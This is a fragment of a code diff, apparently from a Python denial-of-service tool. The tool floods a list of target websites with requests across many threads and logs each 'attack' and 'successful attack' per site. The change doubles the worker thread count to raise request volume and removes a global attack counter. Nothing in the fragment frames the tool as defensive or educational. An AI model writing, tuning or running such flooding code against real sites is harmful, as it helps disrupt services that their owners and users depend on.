@@ -41,10 +41,7 @@ remoteProvider = RemoteProvider(args.targets)
 threads = int(args.threads)
 
 submitted_tasks = []
-executor = ThreadPoolExecutor(max_workers=threads)
-
-last_observed_total_attacks_count = 0
-total_attacks_count = 0
+executor = ThreadPoolExecutor(max_workers=threads * 2)
 
 logger.remove()
 logger.add(
@@ -94,7 +91,6 @@ def mainth(site: str):
                         if response.status_code >= 400:
                             break
                         count_attacks_for_current_site += 1
-                        total_attacks_count += 1
                         logger.info(f"Successful attack of {site}; attack count: {count_attacks_for_current_site}; code: {response.status_code}")
         else:
             while (count_attacks_for_current_site < settings.MAX_REQUESTS_TO_SITE):
@@ -102,7 +98,6 @@ def mainth(site: str):
                 if response.status_code >= 400:
                     break
                 count_attacks_for_current_site += 1
-                total_attacks_count += 1
                 logger.info(f"ATTACKED {site}; attack count: {count_attacks_for_current_site}; RESPONSE CODE: {response.status_code}")
         if count_attacks_for_current_site > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(count_attacks_for_current_site))
